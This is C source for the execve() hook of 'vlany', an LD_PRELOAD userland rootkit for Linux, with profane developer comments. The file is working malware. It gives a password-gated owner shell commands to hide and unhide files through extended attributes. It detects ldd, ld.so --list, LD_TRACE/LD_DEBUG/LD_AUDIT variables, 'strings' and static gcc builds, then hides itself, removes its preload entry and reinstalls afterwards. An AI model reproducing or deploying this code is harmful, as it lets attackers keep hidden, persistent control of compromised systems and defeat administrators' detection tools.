// a lotta shit happens in here. I really should clean all of this up
// brace for plethora of commentary. it's to help me. not you. (ok maybe you sometimes)
// I could probably tidy up this entire file, but I implemented it in an earlier version of vlany, and utlimately, I'm lazy

// in terms of functionality however, the tidiness (or lack thereof) doesn't detriment the execve hook.
// I'll also be tidying up bits here and there, so the final form (lol nice joke loser)
// probably will look somewhat clean anyway

// if you want to add your own commands in here, just try to follow the same structure as the default commands, it helps

// saves me hardcoding in usage instructions for each command
char *busage(char *path, char **uoptions, int sopt)
{
    // not a fan of the way i'm doing this, but it works
    char *opts = (char *)malloc(128);
    char _opts[128], *ret = (char *)malloc(256);
    int i=0;
    do // eaier than using a for loop
    {
        char *copt = strdup(uoptions[i]); xor(copt);
        snprintf(_opts, sizeof(_opts), "%s/", copt);
        CLEAN(copt);
        strcat(opts, _opts);
        i += 1; // yeah yeah i know
    }while(uoptions[i] != NULL);
    opts[strlen(opts) - 1] = 0; // remove the trailing '/' character from the built string

    // size may be a little over the actual necessary size, but only by a tiny amount
    char *x_usage = strdup(X_USAGE); xor(x_usage);
    snprintf(ret, strlen(x_usage) + strlen(path) + strlen(opts), x_usage, path, opts);
    CLEAN(x_usage); return ret;
}

// unhide when needed.
// char *c_wrning is usually taken from const.h,
// named *_WARNING (i.e. APT_WARNING, YUM_WARNING),
// it is the warning string that will show before prompting enter be pressed.
void unhide_proc(char *c_wrning)
{
    // show user warning
    char c = 0, *wrning = strdup(c_wrning); xor(wrning);
    printf("%s", wrning); CLEAN(wrning);

    // wait until newline char is received
    while(c != '\n') c = getchar();

    // relocate
    chdir("/");

    HOOK(old_setgid, CSETGID);
    char *sccss = strdup(GID_SET); xor(sccss);
    printf("%s", sccss); CLEAN(sccss);
    old_setgid(0); // finally, unhide
}

int execve(const char *filename, char *const argv[], char *const envp[])
{
    #ifdef DEBUG
        printf("[vlany] execve() called\n");
    #endif

    HOOK(old_execve, CEXECVE);
    HOOK(old_unlink, CUNLINK);

    int i, pid, ret;

    // entire owned() check allows user of the owner shell to use the vlany execve functions
    if(owned())
    {
        if(argv[1] != NULL)
        {
            char *execve_pw = strdup(EXECVE_PW); xor(execve_pw);

            // if the first argument of argv is the user's execve password, the user using the owner shell
            // is in fact the fully authorized owner of the rootkit. allow them access to the execve commands :)
            if(!strcmp(argv[1], execve_pw))
            {
                // the TWO functions relative to file hiding
                HOOK(old_setxattr, CSETXATTR);
                HOOK(old_removexattr, CREMOVEXATTR);

                char *yum = strdup(YUM); xor(yum);
                if(strstr(filename, yum))
                {
                    CLEAN(yum);

                    // build yum usage
                    char *yum_usage = busage(argv[0], yum_options, YUM_OPT_SIZE);
                    if(argv[2] == NULL) { printf("%s", yum_usage); exit(0); } // show usage and exit if no operation argument is given
                    int s = 0;
                    for(int i=0;i<YUM_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1; // check if a valid operation was given
                    if(!s) { printf("%s", yum_usage); exit(0); } // show usage and exit if not

                    // get the cwd for later and assume a normal user
                    char old_cwd[512];
                    getcwd(old_cwd, sizeof(old_cwd));
                    unhide_proc(YUM_WARNING);

                    // this system i have now is so much better than previous versions. don't know why i haven't done this before now
                    for(int i=0;i<YUM_COM_SIZE;i++)
                    {
                        char *c_opt = strdup(yum_options[i]); xor(c_opt);
                        if(!strcmp(argv[2], c_opt)) // match found??
                        {
                            char *ex = strdup(yum_commands[i]); xor(ex); // the two arrays have relative indexes between command names and commands themselves
                            if(strstr(ex, "%%s")) // does the command require a third argument?
                            {// if so, take the third argument into consideration
                                char buf[128];
                                snprintf(buf, sizeof(buf), ex, argv[3]);
                                system(buf);
                            }else system(ex); // since not, just do a simple
                            CLEAN(ex); CLEAN(c_opt); break; // no point in still looping after this
                        }
                        CLEAN(c_opt);
                    }

                    old_setgid(MAGIC_GID); // rehide after calling unhide_proc

                    char *yum_success = strdup(E_SMSG); xor(yum_success);
                    printf(yum_success, argv[0]); CLEAN(yum_success);
                    chdir(old_cwd); exit(0);
                }

                char *apt = strdup(APT); xor(apt);
                if(strstr(filename, apt))
                {
                    CLEAN(apt);

                    // build apt usage
                    char *apt_usage = busage(argv[0], apt_options, APT_OPT_SIZE);
                    if(argv[2] == NULL) { printf("%s", apt_usage); exit(0); }
                    int s = 0;
                    for(int i=0;i<APT_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1;
                    if(!s) { printf("%s", apt_usage); exit(0); } // apt will handle messages if no third argument is given for install

                    // looking at this, i want to make process unhiding & hiding generally safer and more difficult for third parties
                    char old_cwd[512];
                    getcwd(old_cwd, sizeof(old_cwd));
                    unhide_proc(APT_WARNING);

                    for(int i=0;i<APT_COM_SIZE;i++)
                    {
                        char *c_opt = strdup(apt_options[i]); xor(c_opt);
                        if(!strcmp(argv[2], c_opt))
                        {
                            char *ex = strdup(apt_commands[i]); xor(ex);
                            if(strstr(ex, "%%s"))
                            {
                                char buf[64];
                                snprintf(buf, sizeof(buf), ex, argv[3]);
                                system(buf);
                            }else system(ex);
                            CLEAN(ex); CLEAN(c_opt); break;
                        }
                        CLEAN(c_opt);
                    }

                    old_setgid(MAGIC_GID);

                    char *apt_success = strdup(E_SMSG); xor(apt_success);
                    printf(apt_success, argv[0]); CLEAN(apt_success);
                    chdir(old_cwd); exit(0);
                }
                CLEAN(apt);

                char *unhide_file = strdup(UNHIDE_FILE); xor(unhide_file);
                if(strstr(filename, unhide_file))
                {
                    CLEAN(unhide_file);
                    if(argv[2] == NULL)
                    {
                        char *unhide_usage = strdup(UNHIDE_USAGE); xor(unhide_usage);
                        printf("%s", unhide_usage);
                        CLEAN(unhide_usage); exit(0);
                    }

                    char *target_file = argv[2];

                    char *install = strdup(INSTALL); xor(install);
                    char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
                    if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file))
                    {
                        printf("Try to unhide that again and I'll fucking kill you.\n");
                        CLEAN(ld_preload_etc); CLEAN(install); exit(0);
                    }
                    CLEAN(ld_preload_etc); CLEAN(install);

                    char *xattr = strdup(XATTR), xattr_user[256];
                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);

                    xor(hidden_xattr_1_str); xor(xattr);
                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str); // create user.blahblahblah attribute to hide the file
                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);

                    int ret = old_removexattr(target_file, xattr_user);

                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
                    if(ret < 0 && errno == ENODATA) { printf("File %s isn't hidden.\n", target_file); exit(0); } // visible file

                    char *unhide_success = strdup(UNHIDE_SUCCESS); xor(unhide_success);
                    printf(unhide_success, target_file);
                    CLEAN(unhide_success); exit(0);
                }
                CLEAN(unhide_file);

                char *hide_file = strdup(HIDE_FILE); xor(hide_file);
                if(strstr(filename, hide_file))
                {
                    CLEAN(hide_file);
                    if(argv[2] == NULL)
                    {
                        char *hide_usage = strdup(HIDE_USAGE); xor(hide_usage);
                        printf("%s", hide_usage);
                        CLEAN(hide_usage); exit(0);
                    }

                    char *target_file = argv[2], xattr_user[256];
                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
                    char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
                    char *xattr = strdup(XATTR);

                    xor(hidden_xattr_1_str); xor(xattr);
                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);

                    xor(hidden_xattr_2_str);
                    int ret = old_setxattr(target_file, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
                    CLEAN(hidden_xattr_2_str);

                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
                    if(ret < 0 && errno == EEXIST) { printf("File %s is already hidden.\n", target_file); exit(0); } // file already hidden

                    char *hide_success = strdup(HIDE_SUCCESS); xor(hide_success);
                    printf(hide_success, target_file);
                    CLEAN(hide_success); exit(0);
                }
                CLEAN(hide_file);

                char *help = strdup(HELP); xor(help);
                if(strstr(filename, help))
                {
                    CLEAN(help);
                    char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
                    printf("%s\n", shell_msg);
                    CLEAN(shell_msg); exit(0);
                }
                CLEAN(help);

            }

            CLEAN(execve_pw);
        }

        // if the user of the owner shell is just executing a regular command/binary, just continue as normal
        return old_execve(filename, argv, envp);
    }

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(strstr(filename, "su") && !strcmp(argv[1], vlany_user) && strlen(vlany_user) == strlen(argv[1])) { CLEAN(vlany_user); errno = EIO; return -1; }
    CLEAN(vlany_user);

    if(hidden_xattr(filename)) { errno = ENOENT; return -1; }

    // we need to hide from rootkit detection tools. in order to do this, we'll remove ourself during the checks, and then
    // when all of the rootkit checks are finished, we'll reinstall ourselves. simple. :)

    // moved the evasions into one function called hide_vlany. this saves me a lot of time.
    // previously, checking for each GAY PROCESS was done in seperate blocks of code. now the names of the GAY PROCESSES
    // are stored in an array and looped through below. :)
    // see config.py (GAY_PROCS) to add your own processes/binaries/environment variables to hide from

    for(i = 0; i < GPSIZE; i++)
    {
        char *gpstr = strdup(gay_procs_list[i]); xor(gpstr);
        int check_curr_proc = hide_vlany(filename, gpstr, ret);
        CLEAN(gpstr);

        if(check_curr_proc == 1) exit(0);
        else if(check_curr_proc == 0) { errno = EIO; return -1; }
        else if(check_curr_proc == -1) return -1;
        else if(check_curr_proc == 2) return old_execve(filename, argv, envp);
        else continue; // don't /really/ have to have this here... but it's here
    }

    char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
    char *ld_so_path = strdup(LD_SO_PATH); xor(ld_so_path);

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
    
    if(!fnmatch(ld_linux_so_path, filename, FNM_PATHNAME) || !fnmatch(ld_so_path, filename, FNM_PATHNAME))
    {
        for(i = 0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "--list")) // there's no point in hiding this string.. it's so ambiguous it doesn't even matter lol
            {
                CLEAN(ld_so_path); CLEAN(ld_linux_so_path);

                if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }

                old_unlink(ld_preload);
                CLEAN(ld_preload);

                if((pid = fork()) == -1) return -1;
                else if(pid == 0) return old_execve(filename, argv, envp);

                wait(&ret); reinstall();
                exit(0);
            }
        }
    }
    CLEAN(ld_so_path);
    CLEAN(ld_linux_so_path);

    // you trying to find me? FUCK YOU LDD
    for(i = 0; envp[i] != NULL; i++)
    {
        char *ld_trace_env_var = strdup(LD_TRACE_ENV_VAR); xor(ld_trace_env_var);
        char *ld_debug_env_var = strdup(LD_DEBUG_ENV_VAR); xor(ld_debug_env_var);
        char *ld_audit_env_var = strdup(LD_AUDIT_ENV_VAR); xor(ld_audit_env_var);
        char *ld_audit_getenv = strdup(LD_AUDIT_GETENV); xor(ld_audit_getenv);
        if(strstr(envp[i], ld_trace_env_var) || strstr(envp[i], ld_debug_env_var) || strstr(envp[i], ld_audit_env_var) || getenv(ld_audit_getenv))
        {
            CLEAN(ld_trace_env_var);
            CLEAN(ld_debug_env_var);
            CLEAN(ld_audit_env_var);
            CLEAN(ld_audit_getenv);

            if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }

            old_unlink(ld_preload);
            CLEAN(ld_preload);

            if((pid = fork()) == -1) return -1;
            else if(pid == 0) return old_execve(filename, argv, envp);

            wait(&ret); reinstall(); exit(0);
        }
        CLEAN(ld_trace_env_var);
        CLEAN(ld_debug_env_var);
        CLEAN(ld_audit_env_var);
        CLEAN(ld_audit_getenv);
    }

    char *libc_path = strdup(LIBC_PATH); xor(libc_path);
    char *ld_preload_env = strdup(LD_PRELOAD_ENV); xor(ld_preload_env);
    for(i = 0; envp[i] != NULL; i++)
    {
        if(getenv(ld_preload_env) && strstr(envp[i], libc_path)) // don't look at me!! i'm naked!!
        {
            CLEAN(ld_preload_env); CLEAN(libc_path);
            errno = EPERM; return -1; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
        }
    }
    CLEAN(ld_preload_env);
    CLEAN(libc_path);

    if(argv[0] != NULL && strstr(argv[0], "strings"))
    {
        char *lib_name = strdup(LIB_NAME); xor(lib_name);
        for(i=0; argv[i] != NULL;i++)
        {
            if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-2")) // strstr and not strcmp because it could be a full path
            {
                CLEAN(lib_name);
                errno = EPERM; return -1;
            }
        }
        CLEAN(lib_name);
    }

    if(argv[0] != NULL && strstr(argv[0], "gcc")) for(i=0; argv[i] != NULL;i++) if(!strcmp(argv[i], "-static")) strncpy(argv[i], "-Wvarargs", strlen("-Wvarargs"));

    if(geteuid() == 0) reinstall();

    return old_execve(filename, argv, envp);
}
